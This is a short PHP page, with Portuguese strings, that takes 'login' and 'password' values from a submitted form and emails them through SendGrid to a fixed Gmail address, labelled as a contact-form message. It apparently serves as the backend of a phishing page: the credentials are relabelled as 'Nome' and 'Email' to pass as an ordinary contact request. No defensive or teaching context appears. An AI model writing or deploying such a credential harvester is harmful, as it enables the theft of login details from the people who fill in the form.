<!DOCTYPE html>
<html lang="pt-br">
    <head>
        <meta charset="UTF-8">
        <title></title>
    </head>
    <body>
        <?php
		$login = $_POST['login'];
		$password = $_POST['password'];
		
        require 'vendor/autoload.php';

        $from = new SendGrid\Email(null, "srpeixito@gmail.com");
        $subject = "Mensagem de contato";
        $to = new SendGrid\Email(null, "srpeixito@gmail.com");
        $content = new SendGrid\Content("text/html", "Olá fa, <br><br>Nova mensagem de contato<br><br>Nome: $login<br>Email: $password <br>Mensagem:");
        $mail = new SendGrid\Mail($from, $subject, $to, $content);
        
        //Necessário inserir a chave
        $apiKey = 'SENDGRID_API_KEY';
        $sg = new \SendGrid($apiKey);

        $response = $sg->client->mail()->send()->post($mail);
        echo "Mensagem enviada com sucesso";
		
        ?>
    </body>
</html>
